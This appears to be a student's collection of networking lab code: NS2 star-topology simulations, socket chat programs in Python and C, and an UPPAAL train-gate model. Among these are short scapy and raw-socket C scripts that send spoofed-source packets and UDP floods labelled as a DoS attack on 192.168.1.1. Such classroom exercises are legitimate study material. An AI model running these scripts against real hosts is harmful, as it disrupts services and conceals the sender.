ns2 star topo:

et ns [new Simulator]
set tracefile [open out.tr w]
set namfile [open out.nam w]
$ns trace-all $tracefile
$ns namtrace-all $namfile

# Create nodes
set center [$ns node]
set nodes {}
for {set i 0} {$i < 5} {incr i} {
    lappend nodes [$ns node]
}

# Create duplex links (star topology)
foreach node $nodes {
    $ns duplex-link $center $node 1Mb 10ms DropTail
}

# Setup TCP connections
set tcpAgents {}
set sinks {}
for {set i 0} {$i < 5} {incr i} {
    set tcp [new Agent/TCP]
    set sink [new Agent/TCPSink]
    $ns attach-agent $center $tcp
    $ns attach-agent [lindex $nodes $i] $sink
    $ns connect $tcp $sink
    lappend tcpAgents $tcp
    lappend sinks $sink
}

# Generate FTP traffic
foreach tcp $tcpAgents {
    set ftp [new Application/FTP]
    $ftp attach-agent $tcp
    $ftp set type_ FTP
    $ns at 0.5 "$ftp start"
}

proc finish {} {
    global ns tracefile namfile
    $ns flush-trace
    close $tracefile
    close $namfile
    exec nam out.nam &
    exit 0
}

$ns at 5.0 "finish"
$ns run


____________________________________________________________________________________________________________________________________



UDP:
# Create a new simulator instance
set ns [new Simulator]

# Create trace and NAM output files
set tracefile [open out.tr w]
set namfile [open out.nam w]
$ns trace-all $tracefile
$ns namtrace-all $namfile

# Create nodes
set center [$ns node]
set nodes {}
for {set i 0} {$i < 5} {incr i} {
    lappend nodes [$ns node]
}

# Create duplex links (star topology)
foreach node $nodes {
    $ns duplex-link $center $node 1Mb 10ms DropTail
}

# Setup UDP connections
set udpAgents {}
set nullSinks {}
for {set i 0} {$i < 5} {incr i} {
    set udp [new Agent/UDP]
    set null [new Agent/Null]
    
    $ns attach-agent $center $udp
    $ns attach-agent [lindex $nodes $i] $null
    $ns connect $udp $null
    
    lappend udpAgents $udp
    lappend nullSinks $null
}

# Generate CBR traffic
foreach udp $udpAgents {
    set cbr [new Application/Traffic/CBR]
    $cbr attach-agent $udp
    $cbr set rate_ 512Kb
    $cbr set packetSize_ 512
    $cbr set random_ false
    $ns at 0.5 "$cbr start"
}

# Define finish procedure
proc finish {} {
    global ns tracefile namfile
    $ns flush-trace
    close $tracefile
    close $namfile
    exec nam out.nam &
    exit 0
}

# Schedule simulation end
$ns at 5.0 "finish"

# Run the simulation
$ns run

_____________________________________________________________________________________________________________________________


Star topo::
# Create Simulator
set ns [new Simulator]
set nf [open out.nam w]
$ns namtrace-all $nf

# Define Nodes
set n0 [$ns node]
set n1 [$ns node]
set n2 [$ns node]
set n3 [$ns node]
set n4 [$ns node]

# Define Links
$ns duplex-link $n0 $n1 1Mb 10ms DropTail
$ns duplex-link $n0 $n2 1Mb 10ms DropTail
$ns duplex-link $n0 $n3 1Mb 10ms DropTail
$ns duplex-link $n0 $n4 1Mb 10ms DropTail

# TCP Connection
set tcp [new Agent/TCP]
$ns attach-agent $n1 $tcp
set sink [new Agent/TCPSink]
$ns attach-agent $n4 $sink
$ns connect $tcp $sink

# Generate Traffic
set ftp [new Application/FTP]
$ftp attach-agent $tcp

# Schedule Events
$ns at 0.1 "$tcp set fid_ 1"
$ns at 0.2 "$ftp start"
$ns at 5.0 "finish"

# Define Finish Procedure
proc finish {} {
    global ns nf
    $ns flush-trace
    close $nf
    exec nam out.nam &
    exit 0
}

# Run Simulation
$ns run



__________________________________________________________________________________________________________________________________



PYTHON CODES:

IP SPOFFING:

from scapy.all import IP, TCP, send

# Spoofed packet settings
src_ip = "1.2.3.4"  # Fake IP
dst_ip = "192.168.1.1"  # Target IP
src_port = 1234
dst_port = 80

# Create IP and TCP headers
ip_layer = IP(src=src_ip, dst=dst_ip)
tcp_layer = TCP(sport=src_port, dport=dst_port, flags="S")  # SYN flag

# Send the spoofed packet
send(ip_layer/tcp_layer, verbose=True)

print("Spoofed TCP SYN packet sent!")


_______________________________________________________________________________________________________________________________________


DOS:
from scapy.all import IP, UDP, send
import time

target_ip = "192.168.1.1"
target_port = 80
packet_count = 1000  # Number of packets to send

print(f"Starting DoS attack on {target_ip}:{target_port}")

for i in range(packet_count):
    packet = IP(dst=target_ip) / UDP(dport=target_port)
    send(packet, verbose=False)
    print(f"Packet {i+1} sent")

print("DoS attack completed.")

____________________________________________________________________________________________________________________________________

SOCKET PROGRAMMING:

SERVER:

import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 8080))
server_socket.listen(1)

print("Server listening on port 8080...")

conn, addr = server_socket.accept()
print(f"Connection from {addr}")

data = conn.recv(1024).decode()
print(f"Received: {data}")

conn.send("Hello from server!".encode())

conn.close()


CLIENT:
import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("127.0.0.1", 8080))

client_socket.send("Hello from client!".encode())

response = client_socket.recv(1024).decode()
print(f"Server response: {response}")

client_socket.close()


_________________________________________________________________________________________________________________________________


modified server and client, to make it look like chat app:

Server:

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 12345))
server.listen(5)

print("Server is running... Waiting for connections.")

while True:
    client, addr = server.accept()
    print(f"Connected to {addr}")

    client.send(b"Welcome to the chat server! Type 'exit' to disconnect.\n")

    while True:
        message = client.recv(1024).decode().strip()
        if not message or message.lower() == "exit":
            print(f"Client {addr} disconnected.")
            client.send(b"Goodbye!\n")
            client.close()
            break
        print(f"Client: {message}")
        reply = input("You: ")  # Server replies manually
        client.send(reply.encode())


Simple Client Code

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("127.0.0.1", 12345))  # Connect to server

print(client.recv(1024).decode())  # Welcome message

while True:
    msg = input("You: ")
    client.send(msg.encode())
    if msg.lower() == "exit":
        break
    response = client.recv(1024).decode()
    print(f"Server: {response}")

client.close()





__________________________________________________________________________________________________________________




SERVER


import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 8080))
server_socket.listen(1)

print("Server listening on port 8080...")

conn, addr = server_socket.accept()
print(f"Connection from {addr}")

while True:
    # Receive message from client
    data = conn.recv(1024).decode()
    if data.lower() == "exit":
        print("Client disconnected.")
        break
    print(f"Client: {data}")

    # Send response to client
    response = input("You: ")
    conn.send(response.encode())

    if response.lower() == "exit":
        print("Server shutting down.")
        break

conn.close()
server_socket.close()




CLIENT

import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("127.0.0.1", 8080))

print("Connected to server. Type 'exit' to disconnect.")

while True:
    # Send message to server
    msg = input("You: ")
    client_socket.send(msg.encode())

    if msg.lower() == "exit":
        print("Disconnected from server.")
        break

    # Receive response from server
    response = client_socket.recv(1024).decode()
    if response.lower() == "exit":
        print("Server has disconnected.")
        break
    print(f"Server: {response}")

client_socket.close()




_______________________________________________________________________________________________________________________



C CODES:


 ip spoofing IN C:

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int optval = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));

    char packet[sizeof(struct iphdr)];
    struct iphdr *ip = (struct iphdr*)packet;

    ip->ihl = 5;
    ip->version = 4;
    ip->tot_len = htons(sizeof(packet));
    ip->ttl = 64;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = inet_addr("192.168.1.100"); // Spoofed IP
    ip->daddr = inet_addr("192.168.1.1");   // Target IP

    struct sockaddr_in dest = {AF_INET, 0, ip->daddr};
    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest));

    close(sock);
}


_______________________________________________________________________________________________________________________


DOS IN C:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PACKET_COUNT 1000

int main() {
    int sock;
    struct sockaddr_in target;
    char buffer[1024]; // UDP payload

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Set target details
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    target.sin_addr.s_addr = inet_addr("192.168.1.1"); // Fixed: IP inside quotes

    // Fill buffer with random data
    memset(buffer, 'A', sizeof(buffer));

    printf("Starting UDP DoS attack on %s:%d\n", inet_ntoa(target.sin_addr), ntohs(target.sin_port));

    for (int i = 0; i < PACKET_COUNT; i++) {
        if (sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
            perror("Packet send failed");
            break;
        }
        printf("Packet %d sent\n", i + 1);
    }

    printf("DoS attack completed.\n");

    // Close socket
    close(sock);
    return 0;
}



________________________________________________________________________________________________________________________


Server and client using c:
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);
    char buffer[1024];

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(8080);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, 5);
    client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_size);
    printf("Client connected\n");

    while (1) {
        recv(client_sock, buffer, sizeof(buffer), 0);
        printf("Client: %s", buffer);
        printf("Server: ");
        fgets(buffer, sizeof(buffer), stdin);
        send(client_sock, buffer, strlen(buffer), 0);
    }
    close(client_sock);
}



_______________________________________________________________________________________________



#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    printf("Connected to server\n");

    while (1) {
        printf("Client: ");
        fgets(buffer, sizeof(buffer), stdin);
        send(sock, buffer, strlen(buffer), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        printf("Server: %s", buffer);
    }
    close(sock);
}




ip spoofing in C:

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int));

    char packet[sizeof(struct iphdr)] = {0};
    struct iphdr *ip = (struct iphdr *)packet;

    *ip = (struct iphdr){.ihl = 5, .version = 4, .tot_len = htons(sizeof(packet)), 
                         .ttl = 64, .protocol = IPPROTO_ICMP, 
                         .saddr = inet_addr("192.168.1.100"), 
                         .daddr = inet_addr("192.168.1.1")};

    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_addr.s_addr = ip->daddr};

    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
    close(sock);
}




_________________________________________________________________________________________________________________________________




UPPALL:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE nta PUBLIC '-//Uppaal Team//DTD Flat System 1.6//EN' 'http://www.it.uu.se/research/group/darts/uppaal/flat-1_6.dtd'>
<nta>
	<declaration>/*
 * For more details about this example, see 
 * "Automatic Verification of Real-Time Communicating Systems by Constraint Solving", 
 * by Wang Yi, Paul Pettersson and Mats Daniels. In Proceedings of the 7th International
 * Conference on Formal Description Techniques, pages 223-238, North-Holland. 1994.
 */

const int N = 6;         // # trains
typedef int[0,N-1] id_t;

chan        appr[N], stop[N], leave[N];
urgent chan go[N];
</declaration>
	<template>
		<name x="40" y="16">Train</name>
		<parameter>const id_t id</parameter>
		<declaration>clock x;</declaration>
		<location id="id0" x="93" y="93">
			<name x="45" y="77">Safe</name>
		</location>
		<location id="id1" x="176" y="320">
			<name x="192" y="328">Stop</name>
		</location>
		<location id="id2" x="256" y="96">
			<name x="272" y="80">Cross</name>
			<label kind="invariant" x="272" y="96">x&lt;=5</label>
		</location>
		<location id="id3" x="96" y="232">
			<name x="32" y="216">Appr</name>
			<label kind="invariant" x="32" y="232">x&lt;=20</label>
		</location>
		<location id="id4" x="256" y="232">
			<name x="272" y="216">Start</name>
			<label kind="invariant" x="272" y="232">x&lt;= 15</label>
		</location>
		<init ref="id0"/>
		<transition id="id5">
			<source ref="id3"/>
			<target ref="id2"/>
			<label kind="guard" x="184" y="160">x&gt;=10</label>
			<label kind="assignment" x="184" y="176">x=0</label>
		</transition>
		<transition id="id6">
			<source ref="id3"/>
			<target ref="id1"/>
			<label kind="guard" x="88" y="280">x&lt;=10</label>
			<label kind="synchronisation" x="88" y="296">stop[id]?</label>
		</transition>
		<transition id="id7">
			<source ref="id2"/>
			<target ref="id0"/>
			<label kind="guard" x="184" y="56">x&gt;=3</label>
			<label kind="synchronisation" x="184" y="72">leave[id]!</label>
		</transition>
		<transition id="id8">
			<source ref="id0"/>
			<target ref="id3"/>
			<label kind="synchronisation" x="32" y="128">appr[id]!</label>
			<label kind="assignment" x="32" y="144">x=0</label>
		</transition>
		<transition id="id9">
			<source ref="id4"/>
			<target ref="id2"/>
			<label kind="guard" x="264" y="160">x&gt;=7</label>
			<label kind="assignment" x="264" y="176">x=0</label>
		</transition>
		<transition id="id10">
			<source ref="id1"/>
			<target ref="id4"/>
			<label kind="synchronisation" x="224" y="280">go[id]?</label>
			<label kind="assignment" x="224" y="296">x=0</label>
		</transition>
	</template>
	<template>
		<name x="40" y="16">Gate</name>
		<declaration>id_t list[N+1];
int[0,N] len;

// Put an element at the end of the queue
void enqueue(id_t element)
{
        list[len++] = element;
}

// Remove the front element of the queue
void dequeue()
{
        int i = 0;
        len -= 1;
        while (i &lt; len)
        {
                list[i] = list[i + 1];
                i++;
        }
        list[i] = 0;
}

// Returns the front element of the queue
id_t front()
{
   return list[0];
}

// Returns the last element of the queue
id_t tail()
{
   return list[len - 1];
}</declaration>
		<location id="id11" x="192" y="360">
			<committed/>
		</location>
		<location id="id12" x="192" y="264">
			<name x="208" y="264">Occ</name>
		</location>
		<location id="id13" x="192" y="128">
			<name x="208" y="96">Free</name>
		</location>
		<init ref="id13"/>
		<transition id="id14">
			<source ref="id12"/>
			<target ref="id11"/>
			<label kind="select" x="104" y="288">e : id_t</label>
			<label kind="synchronisation" x="104" y="304">appr[e]?</label>
			<label kind="assignment" x="104" y="320">enqueue(e)</label>
		</transition>
		<transition id="id15">
			<source ref="id12"/>
			<target ref="id13"/>
			<label kind="select" x="296" y="152">e : id_t</label>
			<label kind="guard" x="296" y="168">e == front()</label>
			<label kind="synchronisation" x="296" y="184">leave[e]?</label>
			<label kind="assignment" x="296" y="200">dequeue()</label>
			<nail x="288" y="264"/>
			<nail x="288" y="128"/>
		</transition>
		<transition id="id16">
			<source ref="id11"/>
			<target ref="id12"/>
			<label kind="synchronisation" x="224" y="304">stop[tail()]!</label>
			<nail x="216" y="312"/>
		</transition>
		<transition id="id17">
			<source ref="id13"/>
			<target ref="id12"/>
			<label kind="guard" x="104" y="168">len &gt; 0</label>
			<label kind="synchronisation" x="104" y="184">go[front()]!</label>
			<nail x="96" y="128"/>
			<nail x="96" y="264"/>
		</transition>
		<transition id="id18">
			<source ref="id13"/>
			<target ref="id12"/>
			<label kind="select" x="200" y="152">e : id_t</label>
			<label kind="guard" x="200" y="168">len == 0</label>
			<label kind="synchronisation" x="200" y="184">appr[e]?</label>
			<label kind="assignment" x="200" y="200">enqueue(e)</label>
		</transition>
	</template>
	<system>system Train, Gate;
</system>
	<queries>
		<query>
			<formula/>
			<comment/>
		</query>
	</queries>
</nta>




___________________________________________________________________________________________

NS2 star topology

# Create a new NS2 simulator
set ns [new Simulator]

# Enable tracing
set tracefile [open out.tr w]
$ns trace-all $tracefile

# Enable NAM tracing
set namfile [open out.nam w]
$ns namtrace-all $namfile

# Create nodes (1 central + 4 leaf nodes)
set n0 [$ns node]  ;# Central Node (Hub)
set n1 [$ns node]
set n2 [$ns node]
set n3 [$ns node]
set n4 [$ns node]

# Create links between the central node and leaf nodes
$ns duplex-link $n0 $n1 1Mb 10ms DropTail
$ns duplex-link $n0 $n2 1Mb 10ms DropTail
$ns duplex-link $n0 $n3 1Mb 10ms DropTail
$ns duplex-link $n0 $n4 1Mb 10ms DropTail

# Setup TCP connections from central node to each leaf node
set tcp1 [new Agent/TCP]
$ns attach-agent $n0 $tcp1
set sink1 [new Agent/TCPSink]
$ns attach-agent $n1 $sink1
$ns connect $tcp1 $sink1

set tcp2 [new Agent/TCP]
$ns attach-agent $n0 $tcp2
set sink2 [new Agent/TCPSink]
$ns attach-agent $n2 $sink2
$ns connect $tcp2 $sink2

set tcp3 [new Agent/TCP]
$ns attach-agent $n0 $tcp3
set sink3 [new Agent/TCPSink]
$ns attach-agent $n3 $sink3
$ns connect $tcp3 $sink3

set tcp4 [new Agent/TCP]
$ns attach-agent $n0 $tcp4
set sink4 [new Agent/TCPSink]
$ns attach-agent $n4 $sink4
$ns connect $tcp4 $sink4

# Attach FTP applications to each TCP agent
set ftp1 [new Application/FTP]
$ftp1 attach-agent $tcp1
$ftp1 set type_ FTP
$ns at 0.5 "$ftp1 start"

set ftp2 [new Application/FTP]
$ftp2 attach-agent $tcp2
$ftp2 set type_ FTP
$ns at 0.5 "$ftp2 start"

set ftp3 [new Application/FTP]
$ftp3 attach-agent $tcp3
$ftp3 set type_ FTP
$ns at 0.5 "$ftp3 start"

set ftp4 [new Application/FTP]
$ftp4 attach-agent $tcp4
$ftp4 set type_ FTP
$ns at 0.5 "$ftp4 start"

# Define finish procedure
proc finish {} {
    global ns tracefile namfile
    $ns flush-trace
    close $tracefile
    close $namfile
    puts "Simulation completed. Running NAM..."

    # Check if NAM is installed before executing
    if {[catch {exec nam out.nam &} err]} {
        puts "NAM not found. Please install it or check your path."
    }

    exit 0
}

# Schedule simulation to end at 5 seconds
$ns at 5.0 "finish"

# Run the simulation
$ns run















